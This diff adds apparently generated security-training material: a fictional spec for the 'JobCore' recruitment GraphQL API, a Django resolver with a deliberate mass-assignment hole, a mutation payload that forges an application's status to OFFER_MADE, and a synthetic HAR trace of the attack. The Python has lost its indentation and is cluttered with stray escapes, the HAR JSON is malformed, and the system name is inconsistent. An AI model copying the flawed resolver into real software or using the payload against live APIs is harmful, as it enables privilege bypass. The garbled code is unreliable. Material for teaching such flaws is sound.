@@ -1,0 +1,208 @@
+Here is the twenty-ninth system, focusing on GraphQL-specific security failures. We are shifting into the **HR Tech & Job Portal** sector, focusing on a **Candidate Application Management GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 9.1 (GraphQL Mass Assignment / Vulerabilities in Operations)** combined with **Pattern 1.12 (Mass Assignment via Object Fields)**. This scenario demonstrates how a GraphQL mutation resolver, intended for a candidate to update their own application's metadata (e.g., notes), accepts an input object and blindly maps it to the database model, allowing the candidate to inject an administrative field (`status: OFFER_MADE`) to bypass the recruitment process.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** JobCore Candidate Portal API
+**Document Version:** 3.3.0 (FINAL)
+**Classification:** CONFIDENTIAL / PII & HR DATA SCOPE
+**Domain:** HR Tech / Recruitment / Applicant Tracking System (ATS)
+
+## 1.0 Executive Summary
+JobCore is an Applicant Tracking System (ATS) used by enterprise clients to manage their hiring pipelines. Job seekers use the Candidate Portal API to submit applications, update résumés, and track their application status (e.g., `APPLIED`, `REVIEWING`, `REJECTED`).
+
+The API exposes a GraphQL endpoint to allow candidates to update specific, non-critical data associated with their application. The core security requirement is that only an authenticated recruiter can change the sensitive, state-machine-driven `status` field (e.g., from `INTERVIEW` to `OFFER_MADE`). The candidate should only be allowed to update fields like `candidateNotes`.
+
+## 2.0 Comprehensive Network Topology & Ingress Routing
+The architecture utilizes a centralized GraphQL gateway backed by a Python service.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway (AWS AppSync):** The managed service handles initial authentication and routes all traffic to the single `/graphql` path.
+* **GraphQL Schema:** Defines the `updateApplicationMetadata` mutation.
+
+### 2.2 The Backend Core Services
+* **Application Service (Python Django):** Utilizes a Django ORM backed by a PostgreSQL database. This service contains the vulnerable mutation logic.
+
+## 3.0 Identity, Sessions, and Role Authorization
+Access is governed by standard JWT-based authorization, with a strict role hierarchy separating candidates from recruiters.
+
+### 3.1 User Authentication (JWT)
+Users authenticate via the portal and receive a JWT containing their `user_id` and `role` (`CANDIDATE` or `RECRUITER`).
+
+### 3.2 Authorization Enforcement
+The AppSync gateway ensures the user is authenticated and the application ID belongs to them (basic BOLA). However, the internal Django resolver is relied upon to enforce field-level authorization.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The Django ORM update logic for the `Application` model was designed with the philosophy of "accept all valid input fields" to simplify form submission logic. The update function does not explicitly filter the incoming JSON payload against an allowed-list of fields. Tracked as RISK-HR-GQL-112.*
+
+### 4.1 Vulnerability A: GraphQL Mass Assignment on Application Status
+**Taxonomy Pattern:** 9.1 (GraphQL Operations) & 1.12 (Mass Assignment via Object Fields)
+**Sub-system:** Application Service Resolver (`mutation updateApplicationMetadata`)
+
+**The Deep Architectural Flaw:**
+This vulnerability is a direct result of improper input object handling within the GraphQL mutation resolver.
+
+1. **Mass Assignment (Pattern 1.12):** The `updateApplicationMetadata` mutation accepts a single input object (`CandidateUpdateInput`). The Django resolver simply iterates over all keys in the input and applies the changes to the corresponding database model using the `**input` spread operator (or equivalent). This means any field name that matches a column in the `Application` database table, including the sensitive `status` field, will be written, even if not explicitly exposed in the GraphQL schema.
+
+2. **GraphQL Operation Flaw (Pattern 9.1):** The GraphQL schema intended only to expose benign fields (e.g., `candidateNotes`). The vulnerability lies in the backend resolver's failure to audit the input object against its role.
+
+**The Exploitation Path:**
+
+1. **The Foothold:** A candidate (`user_cand_A`) submits an application (`app_22190`) and is later rejected. Their current status is `REJECTED`.
+2. **The Mutation Crafting:** The attacker crafts a valid `updateApplicationMetadata` mutation, including a benign field (e.g., `candidateNotes: "Updated resume link"`) and maliciously injects the hidden administrative field `status: OFFER_MADE` into the input object.
+3. **The Execution:** The mutation reaches the Python resolver. The Django ORM executes the update: `Application.objects.filter(id='app_22190').update(candidateNotes='...', status='OFFER_MADE')`.
+4. **The Impact:** The candidate's application status is instantly updated to `OFFER_MADE`. This state change triggers downstream services (e.g., a notification to HR) and provides the candidate with the leverage to demand a final job offer, effectively bypassing the entire multi-stage recruitment workflow.
+
+***
+
+# JOBCORP CANDIDATE API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 3.1.0
+**Applies to Architecture:** JobCore Candidate Portal API v3.3.0
+
+## 5.0 Database Schema (PostgreSQL / Django ORM)
+The application model contains both candidate-writable and recruiter-writable state fields within the same object.
+
+```pythonDjango Application Model (Simplified)
+
+class Application(models.Model):
+application_id = models.UUIDField(primary_key=True, default=uuid.uuid4)
+candidate = models.ForeignKey(User, on_delete=models.CASCADE)
+job = models.ForeignKey(Job, on_delete=models.CASCADE)
+\# Candidate-facing, writable fields  
+candidate\_notes = models.TextField(blank=True, default="")  
+resume\_link = models.CharField(max\_length=255)  
+
+\# Recruiter-controlled state (THE VULNERABLE TARGET)  
+status\_choices = \[  
+    ('APPLIED', 'Applied'),  
+    ('REVIEWING', 'Reviewing'),  
+    ('INTERVIEW', 'Interview'),  
+    ('OFFER\_MADE', 'Offer Made'),  
+    ('REJECTED', 'Rejected'),  
+\]  
+status = models.CharField(max\_length=20, choices=status\_choices, default='APPLIED')  
+hiring\_manager\_id = models.CharField(max\_length=100, null=True) 
+```
+
+## 6.0 The Flawed Implementation (Python / Django GraphQL Resolver)
+The resolver implements the Mass Assignment flaw by applying the client's input object directly over the database update operation without whitelisting fields.
+
+### 6.1 Vulnerable GraphQL Resolver
+```pythonFile: resolvers/candidateResolvers.py
+
+from .models import Application
+from .auth import require_candidate_ownership
+
+def resolve_update_metadata(root, info, application_id, input):
+user_id = info.context.user.id
+app = Application.objects.get(application_id=application_id)
+# 1. Ownership check (BOLA enforcement) is performed correctly  
+require\_candidate\_ownership(user\_id, app)  
+
+# VULNERABILITY 9.1 & 1.12: Mass Assignment  
+# The code takes the entire untrusted 'input' dictionary and applies it to the object.  
+# This allows injection of the 'status' field, which matches a database column name.  
+for key, value in input.items():  
+    setattr(app, key, value) # THE CRITICAL FLAW: Arbitrary key assignment  
+
+app.save()  
+return app 
+```
+
+## 7.0 GraphQL API Contract (The Status Injection)
+The attacker queries the mutation with an augmented input object containing the administrative `status` field, exploiting the Mass Assignment flaw.
+
+### 7.1 The Malicious Mutation Payload (Injection)
+**Endpoint:** `POST /graphql`
+**Malicious Request Payload:**
+```graphql
+mutation ForgeApplicationStatus {
+updateApplicationMetadata(
+applicationId: "app_22190",
+input: {
+candidateNotes: "Finalized version of my resume attached.",
+# INJECTED ADMINISTRATIVE FIELD
+status: OFFER_MADE
+}
+) {
+applicationId
+candidateNotes
+status # Confirms the successful injection
+}
+}
+```
+
+**Success Response (200 OK - Status Bypass):**
+```json
+{
+"data": {
+"updateApplicationMetadata": {
+"applicationId": "app_22190",
+"candidateNotes": "Finalized version of my resume attached.",
+"status": "OFFER_MADE"
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL MASS ASSIGNMENT ON APPLICATION STATE (HAR TRACE)
+**Applies to Architecture:** JobCore Candidate Portal API v3.3.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 9.1 & Pattern 1.12)
+
+This HTTP Archive (HAR) trace captures the execution of the state manipulation attack. The attacker submits a single HTTP POST request to the `/graphql` endpoint containing the `updateApplicationMetadata` mutation.
+
+The mutation's input object includes the expected field (`candidateNotes`) but maliciously injects the administrative field `status: OFFER_MADE`. Because the backend resolver blindly applies the entire input object to the Django ORM, the database overwrites the application's critical state. The successful `200 OK` response confirms the database update, and the returned data explicitly exposes the forged `"status": "OFFER_MADE"`.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "AWS AppSync Logs / Django APM",
+"version": "3.3.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T12:15:20.100Z",
+"time": 68,
+"request": {
+"method": "POST",
+"url": "https://api.jobcore.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.jobcore.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfY2FuZF9BIiwicm9sZSI6IkNBTkRJREFURSJ9..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"mutation ForgeApplicationStatus { updateApplicationMetadata(applicationId: \\\"app_22190\\\", input: { candidateNotes: \\\"Finalized version of my resume attached.\\", status: OFFER_MADE }) { applicationId status candidateNotes } }\"}"
+},
+"bodySize": 255
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-latency-ms", "value": "15" }
+],
+"content": {
+"size": 220,
+"mimeType": "application/json",
+"text": "{\"data\": {\"updateApplicationMetadata\": {\"applicationId\": \"app_22190\", \"candidateNotes\": \"Finalized version of my resume attached.\", \"status\": \"OFFER_MADE\"\}}}"
+},
+"bodySize": 220
+}
+}
+]
+}
+}
+```
+
+***
